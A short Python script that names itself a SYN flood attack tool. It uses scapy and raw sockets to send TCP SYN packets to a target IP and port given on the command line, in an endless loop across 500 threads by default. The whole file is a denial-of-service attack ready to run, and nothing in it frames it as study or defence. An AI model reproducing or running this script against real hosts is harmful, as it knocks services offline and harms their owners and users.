import socket
import threading
import sys
from scapy.all import IP, TCP

# SYN flood attack function
def syn_flood(target, port, threads):

    print("Starting SYN flood on", target, "using", threads, "threads")

    # Craft SYN packet
    ip = IP(dst=target)
    tcp = TCP(sport=1234, dport=port, flags='S')
    packet = ip/tcp

    try:
        while True:
            # Send SYN packet
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.sendto(bytes(packet), (target, port))
    except Exception as e:
        print("Error sending SYN packet:", str(e))

# Input handling

# Get target and port
if len(sys.argv) < 2:
    print("Usage: python syn_flood.py <target_ip> [port] [threads]")
    sys.exit(1)

target = sys.argv[1]
port = 80

if len(sys.argv) > 2:
    port = int(sys.argv[2])

# Get thread count
threads = 500
if len(sys.argv) > 3:
    threads = int(sys.argv[3])

# Resolve target DNS name
try:
    target_ip = socket.gethostbyname(target)
except socket.gaierror as e:
    print("Error resolving target:", str(e))
    sys.exit(1)

# Launch SYN flood threads
for _ in range(threads):
    thread = threading.Thread(target=syn_flood, args=(target_ip, port, threads))
    thread.start()
